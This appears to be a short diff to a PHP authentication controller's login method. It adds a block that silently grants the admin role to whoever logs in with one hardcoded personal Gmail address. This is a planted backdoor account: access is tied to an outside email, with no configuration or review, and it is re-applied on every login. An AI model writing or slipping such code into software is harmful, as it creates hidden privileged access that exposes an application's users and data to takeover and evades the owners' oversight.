@@ -59,6 +59,11 @@ class AuthController extends Controller
             $user->update(['role' => 'admin']);
         }
 
+        // Force admin role if email matches
+        if ($user->email === 'rahator44@gmail.com' && $user->role !== 'admin') {
+            $user->update(['role' => 'admin']);
+        }
+
         $user->update(['last_login_at' => now()]);
 
         return $this->respondWithToken($token, $user);
